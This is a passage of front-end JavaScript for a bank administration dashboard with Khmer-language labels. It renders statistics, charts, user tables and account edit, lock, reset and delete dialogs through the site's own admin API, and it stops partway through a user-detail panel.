/* ===== Aura Bank Admin — ផ្ទាំងគ្រប់គ្រង ===== */
const API = '/admin/api';
const $ = (s, r = document) => r.querySelector(s);
const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));

let token = localStorage.getItem('aura_admin_token');
let admin = null;
let page = 'dashboard';
let search = '';
let offset = 0;
const LIMIT = 25;
const userFilters = { status: 'all', sort: 'created', order: 'desc', showAll: false };


/* ---------- utils ---------- */
const esc = (v) => String(v ?? '').replace(/[&<>"']/g, (c) =>
  ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

const money = (n) => {
  const v = Number(n);
  if (!Number.isFinite(v)) return '—';
  return '$' + v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
};
const money0 = (n) => {
  const v = Number(n);
  return Number.isFinite(v) ? '$' + v.toLocaleString('en-US', { maximumFractionDigits: 0 }) : '—';
};
const dt = (s) => {
  if (!s) return '—';
  const d = new Date(s);
  if (Number.isNaN(d.getTime())) return esc(s);
  return d.toLocaleString('km-KH', { dateStyle: 'short', timeStyle: 'short' });
};
const dateOnly = (s) => {
  if (!s) return '—';
  const d = new Date(s);
  return Number.isNaN(d.getTime()) ? esc(s) : d.toLocaleDateString('km-KH', { dateStyle: 'medium' });
};
const initials = (name) => {
  const s = String(name || '?').trim();
  if (!s) return '?';
  const parts = s.split(/\s+/).filter(Boolean);
  if (/^[A-Za-z]/.test(s) && parts.length > 1) return (parts[0][0] + parts[1][0]).toUpperCase();
  return s.charAt(0).toUpperCase();
};

const AV_GRADIENTS = [
  ['#6366f1', '#a855f7'], ['#0ea5e9', '#22d3ee'], ['#f59e0b', '#f43f5e'],
  ['#10b981', '#14b8a6'], ['#ec4899', '#8b5cf6'], ['#f97316', '#facc15'],
  ['#3b82f6', '#6366f1'], ['#ef4444', '#f97316'], ['#14b8a6', '#0ea5e9'],
  ['#8b5cf6', '#ec4899'],
];
const avHash = (s) => { let h = 0; const str = String(s || ''); for (let i = 0; i < str.length; i++) h = (h * 31 + str.charCodeAt(i)) >>> 0; return h; };
const avGradient = (name) => AV_GRADIENTS[avHash(name) % AV_GRADIENTS.length];

// រូបភាពតូចជា base64 (ដកផ្លូវមិនមាន data: prefix) — រកឃើញប្រភេទដោយស្តាប់ពិត
const thumbSrc = (b64) => {
  if (!b64) return '';
  let mime = 'jpeg';
  try {
    const head = atob(String(b64).slice(0, 16));
    if (head.startsWith('\x89PNG')) mime = 'png';
    else if (head.startsWith('RIFF') && head.slice(8, 12) === 'WEBP') mime = 'webp';
  } catch (_) { /* ប្រើ jpeg ធម្មតា */ }
  return `data:image/${mime};base64,${b64}`;
};

const avatarHtml = (name, thumb, status, size = '') => {
  const [a, b] = avGradient(name);
  const style = `--av-a:${a};--av-b:${b}`;
  const cls = `avatar${size ? ' ' + size : ''}`;
  const img = thumb
    ? `<img class="${cls}" style="${style}" src="${thumbSrc(thumb)}" alt="">`
    : `<span class="${cls}" style="${style}">${esc(initials(name))}</span>`;
  if (status === undefined || status === null) return img;
  return `<span class="avatar-wrap">${img}<span class="dot ${status ? 'on' : 'off'}"></span></span>`;
};

/* ---------- live / offline ---------- */
const liveBadge = (r) => r.online
  ? '<span class="live on"><i></i>Live</span>'
  : '<span class="live off"><i></i>Offline</span>';

const roleBadge = (role) => {
  const map = {
    management: ['👑', 'Management', 'ok'],
    administration: ['🏢', 'Administration', 'info'],
    operations: ['⚙️', 'Operations', 'warn'],
  };
  const [icon, label, cls] = map[role] || map.operations;
  return `<span class="pill ${cls}" title="${label}">${icon} ${label}</span>`;
};

const ago = (s) => {
  if (!s) return '—';
  const ms = Date.now() - new Date(s).getTime();
  if (!Number.isFinite(ms)) return '—';
  if (ms < 0) return 'ឥឡូវនេះ';
  const sec = Math.floor(ms / 1000);
  if (sec < 60) return `${sec} វិនាទីមុន`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} នាទីមុន`;
  const hr = Math.floor(min / 60);
  if (hr < 24) return `${hr} ម៉ោងមុន`;
  return `${Math.floor(hr / 24)} ថ្ងៃមុន`;
};

const lastSeenHtml = (r) => r.last_seen_at
  ? `<div class="last-seen">ចុងចាស់ ${ago(r.last_seen_at)}</div>
     <div class="last-seen">${dt(r.last_seen_at)}</div>`
  : '<div class="last-seen">មិនដែលចូលកម្ម</div>';


function toast(msg, type = '') {
  const el = $('#toast');
  el.className = `toast ${type}`;
  el.textContent = msg;
  clearTimeout(el._t);
  el._t = setTimeout(() => el.classList.add('hidden'), 3200);
}

function showModal(title, bodyHtml) {
  const modal = $('#modal');
  $('#modalTitle').textContent = title;
  $('#modalBody').innerHTML = bodyHtml;
  $('#modalCancel').style.display = 'none';
  $('#modalSave').style.display = 'none';
  modal.classList.remove('hidden');
  $('#modalClose').onclick = () => modal.classList.add('hidden');
}

async function api(path, opts = {}) {
  const res = await fetch(API + path, {
    ...opts,
    headers: {
      ...(opts.body ? { 'Content-Type': 'application/json' } : {}),
      ...(token ? { Authorization: 'Bearer ' + token } : {}),
      ...(opts.headers || {}),
    },
    body: opts.body ? JSON.stringify(opts.body) : undefined,
  });
  let json = null;
  try { json = await res.json(); } catch (_) {}
  if (!res.ok) {
    if (res.status === 401 && token) { logout(); }
    throw new Error(json?.error || `HTTP ${res.status}`);
  }
  return json?.data;
}

/* ---------- modal ---------- */
let modalSaveHandler = null;
function openModal({ title, body, onSave, wide, saveLabel }) {
  $('#modalTitle').textContent = title;
  $('#modalBody').innerHTML = body;
  modalSaveHandler = onSave || null;
  $('#modalSave').style.display = onSave ? '' : 'none';
  $('#modalSave').textContent = saveLabel || 'រក្សាទុក';
  $('.modal-box').classList.toggle('wide', !!wide);
  $('#modal').classList.remove('hidden');
}
function closeModal() {
  $('#modal').classList.add('hidden');
  modalSaveHandler = null;
}
$('#modalClose').onclick = closeModal;
$('#modalCancel').onclick = closeModal;
$('#modal').onclick = (e) => { if (e.target.id === 'modal') closeModal(); };
$('#modalSave').onclick = async () => {
  if (!modalSaveHandler) return closeModal();
  const btn = $('#modalSave');
  btn.disabled = true;
  try { await modalSaveHandler(); closeModal(); }
  catch (e) { toast(e.message, 'err'); }
  finally { btn.disabled = false; }
};

function confirmDelete(text, fn) {
  openModal({
    title: 'បញ្ជាក់ការលុប',
    body: `<p>${esc(text)}</p><p class="muted">សកម្មនេះមិនអាចត្រឡប់វិញបាន។</p>`,
    onSave: fn,
    saveLabel: 'បញ្ជាក់',
  });
}

function confirmAction(title, text, fn) {
  openModal({
    title,
    body: `<p>${esc(text)}</p>`,
    onSave: fn,
    saveLabel: 'បញ្ជាក់',
  });
}

/* ---------- table ---------- */
function tableHtml(cols, rows, opts = {}) {
  if (!rows.length) return `<div class="empty">${esc(opts.empty || 'មិនទាន់មានទិន្នន័យ')}</div>`;
  const head = cols.map((c) => `<th class="${c.num ? 'num' : ''}">${esc(c.label)}</th>`).join('');
  const body = rows.map((r, i) => `<tr ${opts.rowAttr ? opts.rowAttr(r, i) : ''}>${cols
    .map((c) => `<td class="${c.num ? 'num' : ''}">${c.render(r, i)}</td>`).join('')}</tr>`).join('');
  return `<div class="table-wrap"><table><thead><tr>${head}</tr></thead><tbody>${body}</tbody></table></div>`;
}

function pagerHtml(total, currentOffset, limit) {
  const from = total === 0 ? 0 : currentOffset + 1;
  const to = Math.min(currentOffset + limit, total);
  return `<div class="pager">
    <span>បង្ហាញ ${from}–${to} ក្នុងចំនួន ${total}</span>
    <button class="btn ghost sm" data-page-btn="prev" ${currentOffset <= 0 ? 'disabled' : ''}>‹ មុន</button>
    <button class="btn ghost sm" data-page-btn="next" ${to >= total ? 'disabled' : ''}>បន្ទាប់ ›</button>
  </div>`;
}

/* ---------- charts ---------- */
function drawLine(canvas, points, opts = {}) {
  const dpr = window.devicePixelRatio || 1;
  const w = canvas.clientWidth || 600;
  const h = canvas.clientHeight || 220;
  canvas.width = w * dpr; canvas.height = h * dpr;
  const ctx = canvas.getContext('2d');
  ctx.scale(dpr, dpr);
  ctx.clearRect(0, 0, w, h);
  if (!points.length) return;

  const padL = 46, padR = 12, padT = 14, padB = 26;
  const max = Math.max(...points.map((p) => p.value), 1);
  const x = (i) => padL + (w - padL - padR) * (points.length === 1 ? .5 : i / (points.length - 1));
  const y = (v) => h - padB - (h - padT - padB) * (v / max);

  // grid
  ctx.strokeStyle = 'rgba(255,255,255,.08)'; ctx.lineWidth = 1;
  ctx.fillStyle = '#8fa6c4'; ctx.font = '10px system-ui'; ctx.textAlign = 'right';
  for (let g = 0; g <= 3; g++) {
    const gy = padT + (h - padT - padB) * (g / 3);
    ctx.beginPath(); ctx.moveTo(padL, gy); ctx.lineTo(w - padR, gy); ctx.stroke();
    ctx.fillText(money0(max * (1 - g / 3)), padL - 6, gy + 3);
  }
  // area + line
  const grad = ctx.createLinearGradient(0, padT, 0, h - padB);
  grad.addColorStop(0, 'rgba(59,154,217,.45)');
  grad.addColorStop(1, 'rgba(59,154,217,0)');
  ctx.beginPath();
  points.forEach((p, i) => (i ? ctx.lineTo(x(i), y(p.value)) : ctx.moveTo(x(i), y(p.value))));
  ctx.lineTo(x(points.length - 1), h - padB); ctx.lineTo(x(0), h - padB); ctx.closePath();
  ctx.fillStyle = grad; ctx.fill();
  ctx.beginPath();
  points.forEach((p, i) => (i ? ctx.lineTo(x(i), y(p.value)) : ctx.moveTo(x(i), y(p.value))));
  ctx.strokeStyle = opts.color || '#3b9ad9'; ctx.lineWidth = 2.2; ctx.stroke();
  // dots + labels
  ctx.fillStyle = opts.color || '#3b9ad9';
  points.forEach((p, i) => {
    ctx.beginPath(); ctx.arc(x(i), y(p.value), 3, 0, Math.PI * 2); ctx.fill();
  });
  ctx.fillStyle = '#8fa6c4'; ctx.textAlign = 'center';
  points.forEach((p, i) => {
    if (points.length > 8 && i % 2) return;
    ctx.fillText(p.label, x(i), h - 8);
  });
}

/* ============================================================
   PAGES
   ============================================================ */
const TITLES = {
  dashboard: 'ផ្ទាំងដើម', users: 'អ្នកប្រើ', cards: 'កាត',
  approvals: 'រង់ចាំអនុម័ត',
  transactions: 'ប្រតិបត្តិការ', loans: 'កម្ចី', kyc: 'KYC / CRM',
  collections: 'ប្រមូល', reports: 'របាយការណ៍', notifications: 'សេចក្តីសារ',
  data: 'ទិន្នន័យផ្សេង', audit: 'កំណត់ត្រាក្របរបុប',
  devices: 'គ្រប់គ្រងទូរស័ព្ទ', usage: 'ការប្រើប្រាស់',
};

async function renderDashboard() {
  const s = await api('/stats');
  const t = s.totals;
  $('#content').innerHTML = `
    <div class="grid k3">
      <div class="card kpi accent">
        <div class="kpi-label">អ្នកប្រើសរុប</div>
        <div class="kpi-value">${t.users}</div>
        <div class="kpi-sub">ថ្មី ${t.new_users_7d} នាក់ (7 ថ្ងៃ)</div>
      </div>
      <div class="card kpi ok">
        <div class="kpi-label">🟢 កំពុងប្រើឥឡូវ (Live)</div>
        <div class="kpi-value">${t.online_users || 0}</div>
        <div class="kpi-sub">បន្ថែមពេលវេលា ${s.online_minutes || 5} នាទី</div>
      </div>
      <div class="card kpi">
        <div class="kpi-label">សម្រាប់ការទាក់ទង</div>
        <div class="kpi-value">${money0(t.total_balance)}</div>
        <div class="kpi-sub">${t.cards} កាត</div>
      </div>
      <div class="card kpi">
        <div class="kpi-label">ប្រតិបត្តិការ</div>
        <div class="kpi-value">${t.transactions}</div>
        <div class="kpi-sub">${t.tx_24h} នៅថ្ងៃនេះ</div>
      </div>
      <div class="card kpi warn">
        <div class="kpi-label">កម្ចីកំពុងបញ្ចាស់</div>
        <div class="kpi-value">${money0(t.loan_outstanding)}</div>
        <div class="kpi-sub">${t.active_loans} កម្ចី · ${t.external_transfers} ផ្ទេរក្រៅបទេស</div>
        </div>
      <div class="card kpi">
        <div class="kpi-label">🔒 ត្រូវបានផ្អាក</div>
        <div class="kpi-value">${t.locked_users || 0}</div>
        <div class="kpi-sub">គណនីដែលត្រូវបានផ្អាក</div>

      </div>
    </div>

    <div class="card">
      <div class="card-head"><h3>🟢 អ្នកប្រើកំពុងប្រើឥឡូវ</h3>
        <span class="muted">${s.liveUsers.length} នាក់ · បន្ថែមពេលវេលា ${s.online_minutes || 5} នាទី</span></div>
      ${s.liveUsers.length ? `<div class="live-list">${s.liveUsers.map((u) => `
        <span class="live-chip" data-user-view="${u.id}" style="cursor:pointer">
          ${avatarHtml(u.name, u.avatar_thumb, true)}
          <span><b>${esc(u.name)}</b><br><span class="t">ចុងចាស់ ${ago(u.last_seen_at)}</span></span>
        </span>`).join('')}</div>`
        : '<div class="empty">គ្មានអ្នកប្រើកំពុងប្រើឥឡូវ</div>'}
    </div>

    <div class="grid k2">
      <div class="card">
        <div class="card-head"><h3>ចំនួនប្រតិបត្តិការ 14 ថ្ងៃ</h3>
          <span class="muted">ចំនួន ${t.tx_24h} ថ្ងៃនេះ · ចំនួនប្រាក់ ${money0(t.spend_30d)} (30 ថ្ងៃ)</span>
        </div>
        <div class="chart-box"><canvas id="txChart"></canvas></div>
      </div>
      <div class="card">
        <div class="card-head"><h3>ប្រតិបត្តិការដែលចំណាយច្រើនបំផុត</h3></div>
        <div class="bars" id="catBars"></div>
      </div>
    </div>

    <div class="grid k2">
      <div class="card">
        <div class="card-head"><h3>អ្នកប្រើថ្មីៗ</h3></div>
        ${tableHtml([
    { label: 'ឈ្មោះ', render: (r) => `<div class="cell-user">${avatarHtml(r.name, r.avatar_thumb)}<span>${esc(r.name)}</span></div>` },
    { label: 'អ៊ីមែល', render: (r) => `<span class="muted">${esc(r.email)}</span>` },
    { label: 'ចូលថ្ងៃ', num: true, render: (r) => dateOnly(r.created_at) },
  ], s.recentUsers)}
      </div>
      <div class="card">
        <div class="card-head"><h3>ប្រតិបត្តិការថ្មីៗ</h3></div>
        ${tableHtml([
    { label: 'អ្នកប្រើ', render: (r) => esc(r.user_name) },
    { label: 'ប្រតិបត្តិការ', render: (r) => esc(r.title) },
    { label: 'ប្រាក់', num: true, render: (r) => `<span style="color:${r.is_expense ? '#ff9b9b' : '#7ee2a8'}">${r.is_expense ? '-' : '+'}${money(r.amount)}</span>` },
    { label: 'ពេល', num: true, render: (r) => `<span class="muted">${dt(r.created_at)}</span>` },
  ], s.recentTx, { empty: 'មិនទាន់មានប្រតិបត្តិការ' })}
      </div>
    </div>

    <div class="card">
      <div class="card-head"><h3>អ្នកប្រើមានសម្រាប្រាប់ការទាក់ទងច្រើនបំផុត</h3></div>
      ${tableHtml([
    { label: 'អ្នកប្រើ', render: (r) => `<div class="cell-user">${avatarHtml(r.name, r.avatar_thumb)}<span>${esc(r.name)}</span></div>` },
    { label: 'អ៊ីមែល', render: (r) => `<span class="muted">${esc(r.email)}</span>` },
    { label: 'ប្រតិបត្តិការ', num: true, render: (r) => r.tx_count },
    { label: 'សម្រាប្រាប់', num: true, render: (r) => money(r.balance) },
  ], s.topUsers)}
    </div>`;

  const days = s.daily.map((d) => ({
    label: new Date(d.day).toLocaleDateString('km-KH', { day: 'numeric', month: 'numeric' }),
    value: Number(d.tx),
  }));
  const cv = $('#txChart');
  if (cv) {
    const draw = () => drawLine(cv, days);
    draw();
    window.addEventListener('resize', draw, { once: true });
  }
  const maxCat = Math.max(...s.categories.map((c) => Number(c.total)), 1);
    $$('[data-user-view]').forEach((b) => b.onclick = () => showUser(b.dataset.userView));
$('#catBars').innerHTML = s.categories.length ? s.categories.map((c) => `
    <div class="bar-row">
      <span>${esc(c.category)}</span>
      <span class="bar-track"><span class="bar-fill" style="width:${(Number(c.total) / maxCat * 100).toFixed(1)}%"></span></span>
      <span class="bar-val">${money0(c.total)}</span>
    </div>`).join('') : '<div class="empty">មិនទាន់មានទិន្នន័យ</div>';
}

async function renderUsers() {
  const limit = userFilters.showAll ? 1000 : LIMIT;
  const d = await api(`/users?limit=${limit}&offset=${offset}&q=${encodeURIComponent(search)}&sort=${userFilters.sort}&order=${userFilters.order}`);

  let rows = d.rows;
  if (userFilters.status === 'live') rows = rows.filter((r) => r.online);
  else if (userFilters.status === 'offline') rows = rows.filter((r) => !r.online);
  else if (userFilters.status === 'locked') rows = rows.filter((r) => r.is_locked);
  else if (userFilters.status === 'admin') rows = rows.filter((r) => r.is_admin);

  const onlineCount = d.rows.filter((r) => r.online).length;
  const lockedCount = d.rows.filter((r) => r.is_locked).length;
  const sortOpts = [
    ['created', 'ថ្មីដែរ'], ['name', 'ឈ្មោះ'], ['balance', 'សម្រាប្រាប់'],
    ['tx', 'ប្រតិបត្តិការ'], ['seen', 'ចុងចាស់ប្រើថ្មី'], ['id', 'ID'],
  ].map(([v, n]) => `<option value="${v}" ${userFilters.sort === v ? 'selected' : ''}>${n}</option>`).join('');

  $('#content').innerHTML = `
    <div class="card">
      <div class="card-head">
        <h3>អ្នកប្រើ ${d.total} នាក់</h3>
        <span class="muted">🟢 Live ${onlineCount} · 🔒 ត្រូវបានផ្អាក ${lockedCount} · បន្ថែមពេលវេលា ${d.online_minutes} នាទី</span>
      </div>
      <div class="toolbar" style="margin-bottom:14px">
        <div class="seg">
          <button class="${userFilters.status === 'all' ? 'active' : ''}" data-ustatus="all">ទាំងអស់</button>
          <button class="${userFilters.status === 'live' ? 'active' : ''}" data-ustatus="live">Live</button>
          <button class="${userFilters.status === 'offline' ? 'active' : ''}" data-ustatus="offline">Offline</button>
          <button class="${userFilters.status === 'locked' ? 'active' : ''}" data-ustatus="locked">ត្រូវបានផ្អាក</button>
          <button class="${userFilters.status === 'admin' ? 'active' : ''}" data-ustatus="admin">Admin</button>
        </div>
        <select id="u_sort">${sortOpts}</select>
        <button class="btn ghost sm" id="u_order">${userFilters.order === 'desc' ? '↓ ចុះ' : '↑ ឡើង'}</button>
        <div class="spacer"></div>
        <button class="btn ghost sm" id="u_all">${userFilters.showAll ? 'បង្ហាញ 25 នាក់ក្នុងមួយទំព័រ' : 'បង្ហាញទាំងអស់'}</button>
      </div>
      ${tableHtml([
    { label: 'ID', render: (r) => `#${r.id}` },
    {
      label: 'អ្នកប្រើ', render: (r) => `<div class="cell-user"><button class="avatar-trigger" data-user-view="${r.id}" title="មើលព័ត៌មានលម្អិត" aria-label="មើល ${esc(r.name)}">${avatarHtml(r.name, r.avatar_thumb, r.online)}<span class="av-view">👁</span></button><div>
        <div><span class="user-name-link" data-user-view="${r.id}">${esc(r.name)}</span> ${r.is_admin ? '<span class="pill info">admin</span>' : ''} ${r.is_locked ? '<span class="pill bad">ផ្អាក</span>' : ''}</div>
        <div class="muted" style="font-size:11.5px">${esc(r.email)} · ${esc(r.phone || '—')}</div></div></div>`
    },
    { label: 'ស្ថានភាព', render: (r) => `<div>${liveBadge(r)}</div>${lastSeenHtml(r)}` },
    { label: '🎭 Role', render: (r) => roleBadge(r.role) },
    { label: 'កាត', num: true, render: (r) => r.card_count },
    { label: 'សម្រាប្រាប់', num: true, render: (r) => money(r.balance) },
    { label: 'ប្រតិបត្តិការ', num: true, render: (r) => r.tx_count },
    { label: 'ចូលថ្ងៃ', num: true, render: (r) => `<span class="muted">${dateOnly(r.created_at)}</span>` },
    {
      label: 'សកម្ម', render: (r) => `<div class="row-actions">
        <button class="btn ghost sm" data-user-view="${r.id}" title="មើលព័ត៌មាន">លម្អិត</button><button class="btn ghost sm" data-user-edit="${r.id}" title="កែសម្រួល">កែ</button>
        <button class="btn ghost sm" data-user-lock="${r.id}" data-locked="${r.is_locked ? 1 : 0}" title="${r.is_locked ? 'ដោះសោ' : 'ផ្អាកគណនី'}">${r.is_locked ? '🔓' : '🔒'}</button>
        <button class="btn ghost sm" data-user-reset="${r.id}" title="Reset ទិន្នន័យ">⟲</button>
        <button class="btn danger sm" data-user-del="${r.id}" title="លុបគណនី">🗑</button>
      </div>`
    },
  ], rows, { empty: 'រកមិនឃើញអ្នកប្រើ' })}
      ${pagerHtml(d.total, offset, limit)}
    </div>`;

  bindPager(d.total);
  $$('[data-ustatus]').forEach((b) => b.onclick = () => {
    userFilters.status = b.dataset.ustatus; offset = 0; render();
  });
  $('#u_sort').onchange = (e) => { userFilters.sort = e.target.value; offset = 0; render(); };
  $('#u_order').onclick = () => {
    userFilters.order = userFilters.order === 'desc' ? 'asc' : 'desc'; offset = 0; render();
  };
  $('#u_all').onclick = () => { userFilters.showAll = !userFilters.showAll; offset = 0; render(); };
  $$('[data-user-view]').forEach((b) => b.onclick = () => showUser(b.dataset.userView));
  $$('[data-user-edit]').forEach((b) => b.onclick = () => editUser(b.dataset.userEdit));
  $$('[data-user-lock]').forEach((b) => b.onclick = async () => {
    const lock = b.dataset.locked !== '1';
    try {
      await api(`/users/${b.dataset.userLock}`, { method: 'PATCH', body: { is_locked: lock } });
      toast(lock ? 'បានផ្អាកគណនី' : 'បានដោះសោ', 'ok');
      render();
    } catch (e) { toast(e.message, 'err'); }
  });
  $$('[data-user-reset]').forEach((b) => b.onclick = () => {
    confirmAction('Reset ទិន្នន័យអ្នកប្រើ',
      'លុបទិន្នន័យទាំងអស់របស់អ្នកប្រើនេះ (កាត, ប្រតិបត្តិការ, កម្ចី, គោលបំណង, ថវិកា, សេចក្តីសារ, ប្រាក់វិញ, កំណត់ត្រា) ហើយបង្កើតកាត + គោលបំណងថ្មីវិញ។ សម្រាប្រាប់កាតនឹងត្រូវបានកំណត់ជា 0។',
      async () => {
        await api(`/users/${b.dataset.userReset}/reset`, { method: 'POST', body: { reseed: true } });
        toast('បានកំណត់ទិន្នន័យឡើងវិញ', 'ok');
        render();
      });
  });
  $$('[data-user-del]').forEach((b) => b.onclick = () => {
    confirmAction('បញ្ជាក់ការលុប',
      `លុបគណនី "${b.closest('tr')?.querySelector('[data-user-edit]')?.textContent || ''}"? ទិន្នន័យទាំងអស់ (កាត, ប្រតិបត្តិការ, កម្ចី) នឹងត្រូវបានលុបផង។`,
      async () => {
        await api(`/users/${b.dataset.userDel}`, { method: 'DELETE' });
        toast('បានលុបគណនី', 'ok');
        render();
      });
  });
}

async function editUser(id) {
  const d = await api(`/users/${id}`);
  const u = d.user;
  openModal({
    title: `កែសម្រួលគណនី · ${u.name}`,
    body: `
      <div style="display:flex;gap:14px;align-items:center">
        ${avatarHtml(u.name, u.avatar_thumb, u.online)}
        <div>
          <div>${liveBadge(u)}</div>
          ${lastSeenHtml(u)}
        </div>
      </div>
      <label class="field"><span>ឈ្មោះ</span><input id="f_name" value="${esc(u.name)}"></label>
      <label class="field"><span>អ៊ីមែល</span><input id="f_email" value="${esc(u.email)}"></label>
      <label class="field"><span>លេខទូរស័ព្ទ</span><input id="f_phone" value="${esc(u.phone || '')}"></label>
      <label class="field"><span>PIN ថ្មី (4 ខ្ទង់ — ទុកទទេដើម្បីមិនប្ដូរ)</span><input id="f_pin" maxlength="4" inputmode="numeric" placeholder="••••"></label>
      <label class="field" style="flex-direction:row;align-items:center;gap:10px">
        <input type="checkbox" id="f_admin" ${u.is_admin ? 'checked' : ''} style="width:18px;height:18px">
        <span>សិទ្ធិ Admin (គ្រប់គ្រងទិន្នន័យទាំងអស់)</span></label>
      <label class="field"><span>🎭 Role (កម្រិតសិទ្ធិ)</span>
        <select id="f_role" style="padding:10px;border-radius:8px;border:1px solid #ddd;font-size:14px">
          <option value="management" ${u.role === 'management' ? 'selected' : ''}>👑 Management / Executive (ថ្នាក់ដឹកនាំ)</option>
          <option value="administration" ${u.role === 'administration' ? 'selected' : ''}>🏢 Administration (ថ្នាក់រដ្ឋបាល)</option>
          <option value="operations" ${u.role === 'operations' || !u.role ? 'selected' : ''}>⚙️ Operations / Staff (ថ្នាក់ប្រតិបត្តិការ)</option>
        </select>
      </label>
      <div style="padding:12px;background:#f0f4ff;border-radius:8px;font-size:13px;color:#666;margin:8px 0">
        <strong>📋 សិទ្ធិតាម Role:</strong><br>
        • <strong>Management:</strong> គ្រប់គ្រងទាំងអស់ + 📱 Device Management<br>
        • <strong>Administration:</strong> គ្រប់គ្រងទាំងអស់ <em>លើកលែង</em> 📱 Device Management<br>
        • <strong>Operations:</strong> ដូច Administration
      </div>
      <label class="field" style="flex-direction:row;align-items:center;gap:10px">
        <input type="checkbox" id="f_locked" ${u.is_locked ? 'checked' : ''} style="width:18px;height:18px">
        <span>🔒 ផ្អាកគណនី (មិនអាចចូលប្រើប្រើវិញ)</span></label>
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <button class="btn ok sm" id="f_unlock">🔓 ដោះសោ (unlock)</button>
        <button class="btn ghost sm" id="f_reset">⟲ Reset ទិន្នន័យ</button>
        <button class="btn danger sm" id="f_delete">🗑 លុបគណនី</button>
      </div>`,
    onSave: async () => {
      const body = {
        name: $('#f_name').value.trim(),
        email: $('#f_email').value.trim(),
        phone: $('#f_phone').value.trim(),
        is_admin: $('#f_admin').checked,
        is_locked: $('#f_locked').checked,
        role: $('#f_role').value,
      };
      await api(`/users/${id}`, { method: 'PATCH', body });
      const pin = $('#f_pin').value.trim();
      if (pin) await api(`/users/${id}/pin`, { method: 'POST', body: { pin } });
      toast('បានរក្សាទុកកែសម្រួល', 'ok');
      render();
    },
  });
  $('#f_unlock').onclick = async () => {
    await api(`/users/${id}`, { method: 'PATCH', body: { unlock: true, is_locked: false } });
    toast('បានដោះសោ', 'ok');
    closeModal();
    render();
  };
  $('#f_reset').onclick = () => {
    closeModal();
    confirmAction('Reset ទិន្នន័យអ្នកប្រើ',
      'លុបទិន្នន័យទាំងអស់ (កាត, ប្រតិបត្តិការ, កម្ចី, គោលបំណង, ថវិកា, សេចក្តីសារ, ប្រាក់វិញ, កំណត់ត្រា) ហើយបង្កើតកាត + គោលបំណងថ្មីវិញ។',
      async () => {
        await api(`/users/${id}/reset`, { method: 'POST', body: { reseed: true } });
        toast('បានកំណត់ទិន្នន័យឡើងវិញ', 'ok');
        render();
      });
  };
  $('#f_delete').onclick = () => {
    closeModal();
    confirmAction('បញ្ជាក់ការលុប',
      `លុបគណនី "${u.name}"? ទិន្នន័យទាំងអស់ (កាត, ប្រតិបត្តិការ, កម្ចី) នឹងត្រូវបានលុបផង។`,
      async () => {
        await api(`/users/${id}`, { method: 'DELETE' });
        toast('បានលុបគណនី', 'ok');
        render();
      });
  };
}

async function showUser(id) {
  const d = await api(`/users/${id}`);
  const u = d.user;
  const tabs = [
    ['cards', `កាត (${d.cards.length})`],
    ['transactions', `ប្រតិបត្តិការ (${d.transactions.length})`],
    ['loans', `កម្ចី (${d.loans.length})`],
    ['goals', `គោលបំណង (${d.goals.length})`],
    ['budgets', `ថវិកា (${d.budgets.length})`],
    ['notifications', `សេចក្តីសារ (${d.notifications.length})`],
  ];
  const bodyFor = (key) => {
    if (key === 'cards') return tableHtml([
      { label: 'កាត', render: (r) => esc(r.name) },
      { label: 'លេខ', render: (r) => `<span class="muted">${esc(r.number)}</span>` },
      { label: 'សម្រាប្រាប់', num: true, render: (r) => money(r.balance) },
      { label: 'ដីហទិត/ថ្ងៃ', num: true, render: (r) => money(r.daily_limit) },
      { label: 'ស្ថានភាព', render: (r) => r.frozen ? '<span class="pill bad">បានផ្អាក</span>' : '<span class="pill ok">ធម្មតា</span>' },
    ], d.cards);
    if (key === 'transactions') return tableHtml([
      { label: 'ចំណងជើង', render: (r) => esc(r.title) },
      { label: 'ប្រភេទ', render: (r) => esc(r.category) },
      { label: 'ប្រាក់', num: true, render: (r) => `<span style="color:${r.is_expense ? '#ff9b9b' : '#7ee2a8'}">${r.is_expense ? '-' : '+'}${money(r.amount)}</span>` },
      { label: 'ពេល', num: true, render: (r) => `<span class="muted">${dt(r.created_at)}</span>` },
    ], d.transactions);
    if (key === 'loans') return tableHtml([
      { label: 'ចំនួន', num: true, render: (r) => money(r.principal) },
      { label: 'បានបង់', num: true, render: (r) => money(r.paid) },
      { label: 'ខែ', num: true, render: (r) => r.months },
      { label: 'កាន្លោះ', num: true, render: (r) => r.annual_rate + '%' },
      { label: 'ស្ថានភាព', render: (r) => r.active ? '<span class="pill ok">កំពុង</span>' : '<span class="pill bad">បានបញ្ចប់</span>' },
    ], d.loans);
    if (key === 'goals') return tableHtml([
      { label: 'ឈ្មោះ', render: (r) => esc(r.name) },
      { label: 'គោលបំណង', num: true, render: (r) => money(r.target) },
      { label: 'បានរក្សា', num: true, render: (r) => money(r.saved) },
    ], d.goals);
    if (key === 'budgets') return tableHtml([
      { label: 'ប្រភេទ', render: (r) => esc(r.category) },
      { label: 'ថវិកា', num: true, render: (r) => money(r.amount) },
    ], d.budgets);
    return tableHtml([
      { label: 'ចំណងជើង', render: (r) => esc(r.title) },
      { label: 'អត្ថបទ', render: (r) => `<span class="muted">${esc(r.body)}</span>` },
      { label: 'ពេល', num: true, render: (r) => `<span class="muted">${dt(r.created_at)}</span>` },
    ], d.notifications);
  };

  const [ga, gb] = avGradient(u.name);
  const balance = d.cards.reduce((s, c) => s + (Number(c.balance) || 0), 0);
  const activeLoans = d.loans.filter((l) => l.active).length;
  const stats = [
    ['💰', 'សម្រាប្រាប់', money(balance), 'stat-bal'],
    ['💳', 'កាត', d.cards.length, 'stat-card'],
    ['💸', 'ប្រតិបត្តិការ', d.transactions.length, 'stat-tx'],
    ['📋', 'កម្ចីសកម្ម', activeLoans, 'stat-loan'],
  ];

  openUserDrawer(`
    <div class="udrawer-scrim" data-ud-close></div>
    <aside class="udrawer-panel" style="--av-a:${ga};--av-b:${gb}" role="dialog" aria-modal="true" aria-label="ព័ត៌មានអ្នកប្រើ">
      <div class="udrawer-hero">
        <div class="udrawer-hero-glow"></div>
        <div class="udrawer-hero-grid"></div>
        <button class="udrawer-close" data-ud-close title="បិទ">✕</button>
        <div class="udrawer-hero-tag">#${u.id} · ${esc(u.auth_provider || 'email')}</div>
      </div>
      <div class="udrawer-scroll">
        <div class="udrawer-head">
          <div class="udrawer-av">${avatarHtml(u.name, u.avatar_thumb, u.online, 'xl')}</div>
